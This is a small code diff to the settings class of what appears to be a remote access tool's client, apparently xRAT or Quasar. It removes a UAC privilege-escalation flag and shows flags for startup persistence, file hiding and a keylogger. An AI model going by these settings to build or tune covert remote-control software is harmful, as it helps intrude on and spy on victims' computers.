@@ -21,7 +21,6 @@ namespace xClient.Config
         public static string MUTEX = "123AKs82kA,ylAo2kAlUS2kYkala!";
         public static string STARTUPKEY = "Test key";
         public static bool HIDEFILE = false;
-        public static bool ENABLEUACESCALATION = false;
         public static bool ENABLELOGGER = true;
         public static string TAG = "DEBUG";
 
@@ -41,7 +40,6 @@ namespace xClient.Config
         public static string MUTEX = "MUTEX";
         public static string STARTUPKEY = "STARTUP";
         public static bool HIDEFILE = true;
-        public static bool ENABLEUACESCALATION = true;
         public static bool ENABLELOGGER = true;
         public static string ENCRYPTIONKEY = "ENCKEY";
         public static string TAG = "RELEASE";
